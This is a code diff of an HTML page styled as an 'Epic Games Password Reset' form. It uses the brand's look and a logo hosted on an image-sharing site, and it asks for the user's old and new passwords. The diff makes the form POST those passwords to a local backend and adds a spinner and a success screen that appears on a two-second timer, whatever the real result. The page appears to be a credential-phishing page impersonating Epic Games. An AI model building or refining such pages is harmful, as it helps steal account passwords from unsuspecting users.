@@ -5,9 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Epic Games Password Reset</title>
     <link rel="stylesheet" href="epicgames-html-password.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
 
+    <style>
         body {
             background-color: #181818;
             color: #fff;
@@ -25,24 +24,22 @@
             border-radius: 12px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
             width: 400px;
-        }
-
-        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             text-align: center;
-            margin-bottom: 20px;
         }
 
         .logo img {
-            width: 100px; /* Adjusted logo size */
+            width: 120px; /* Adjusted size */
             height: auto;
+            margin-bottom: 20px;
         }
 
         .MuiTypography-root.MuiTypography-body1.mui-o497ds {
             font-size: 22px;
             font-weight: 500;
-            text-align: center;
             margin-bottom: 20px;
-            letter-spacing: 0.5px;
             color: #f5f5f5;
         }
 
@@ -135,28 +132,49 @@
             box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
         }
 
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #1a1a1a;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
-            color: #ddd;
+        /* Loading Spinner */
+        .loading-spinner {
+            display: none;
+            margin-top: 20px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
         }
 
-        .logo img {
-            display: block;
-            margin: 0 auto 20px;
-            width: 100px; /* Adjusted logo size */
+        /* Spinner Animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .MuiTypography-root {
+        /* Confirmation Screen */
+        .confirmation-message {
+            display: none;
             text-align: center;
-            font-size: 16px;
-            margin-bottom: 20px;
-            color: #ddd;
+            color: #fff;
         }
+
+        .confirmation-message h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .confirmation-message p {
+            font-size: 18px;
+        }
+
+        /* Hiding form while confirmation is shown */
+        .form-container {
+            display: block;
+        }
+
+        .confirmation-container {
+            display: none;
+        }
+
     </style>
 </head>
 <body>
@@ -172,36 +190,48 @@
         </div>
 
         <!-- Form Section -->
-        <form id="resetPasswordForm">
-            <!-- Old Password Section -->
-            <div class="form-group">
-                <label for="oldPassword">Old Password</label>
-                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
-                <span class="show-password" onclick="togglePassword('oldPassword')">👁</span>
-            </div>
+        <div class="form-container">
+            <form id="password-reset-form" action="http://localhost:3000/reset-password" method="POST" onsubmit="showLoading()">
+                <!-- Old Password Section -->
+                <div class="form-group">
+                    <label for="oldPassword">Old Password</label>
+                    <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
+                    <span class="show-password" onclick="togglePassword('oldPassword')">👁</span>
+                </div>
 
-            <!-- New Password Section -->
-            <div class="form-group">
-                <label for="newPassword">New Password</label>
-                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
-                <span class="show-password" onclick="togglePassword('newPassword')">👁</span>
-            </div>
+                <!-- New Password Section -->
+                <div class="form-group">
+                    <label for="newPassword">New Password</label>
+                    <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
+                    <span class="show-password" onclick="togglePassword('newPassword')">👁</span>
+                </div>
 
-            <!-- Password Requirements -->
-            <div class="requirements">
-                <strong>Password Requirements:</strong>
-                <ul>
-                    <li>Must not use any of your last 5 passwords</li>
-                    <li>Must contain at least 7 characters</li>
-                    <li>Must include at least 1 letter</li>
-                    <li>Must include at least 1 number</li>
-                    <li>Must not contain spaces</li>
-                </ul>
-            </div>
+                <!-- Password Requirements -->
+                <div class="requirements">
+                    <strong>Password Requirements:</strong>
+                    <ul>
+                        <li>Must not use any of your last 5 passwords</li>
+                        <li>Must contain at least 7 characters</li>
+                        <li>Must include at least 1 letter</li>
+                        <li>Must include at least 1 number</li>
+                        <li>Must not contain spaces</li>
+                    </ul>
+                </div>
 
-            <!-- Submit Button -->
-            <button type="submit" class="submit-btn">Reset Password</button>
-        </form>
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn">Reset Password</button>
+            </form>
+            <div class="loading-spinner" id="loading-spinner"></div>
+        </div>
+
+        <!-- Confirmation Screen -->
+        <div class="confirmation-container confirmation-message">
+            <div class="logo">
+                <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
+            </div>
+            <h2>Password Reset Successfully!</h2>
+            <p>Your password has been successfully reset.</p>
+        </div>
     </div>
 
     <script>
@@ -211,32 +241,21 @@
             field.type = field.type === 'password' ? 'text' : 'password';
         }
 
-        // AJAX Form Submission
-        document.getElementById('resetPasswordForm').addEventListener('submit', async function(event) {
-            event.preventDefault();  // Prevent form from submitting the normal way
+        // Show Loading Spinner
+        function showLoading() {
+            document.querySelector('.form-container').style.display = 'none';  // Hide the form
+            document.querySelector('#loading-spinner').style.display = 'block'; // Show loading spinner
+        }
 
-            const oldPassword = document.getElementById('oldPassword').value;
-            const newPassword = document.getElementById('newPassword').value;
-
-            // Send POST request to backend
-            const response = await fetch('http://localhost:3000/reset-password', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    oldPassword: oldPassword,
-                    newPassword: newPassword
-                })
-            });
-
-            if (response.ok) {
-                const data = await response.text();
-                alert(data);  // Display the success message
-            } else {
-                alert('There was an error resetting the password.');
+        // After Password Reset is Done, Show Confirmation Message
+        window.onload = function() {
+            if (window.location.pathname === '/reset-password') {
+                // Simulate confirmation (in production, this would be on a success response)
+                setTimeout(function() {
+                    document.querySelector('.confirmation-container').style.display = 'block';
+                }, 2000);  // Simulate loading time of 2 seconds
             }
-        });
+        }
     </script>
 </body>
 </html>
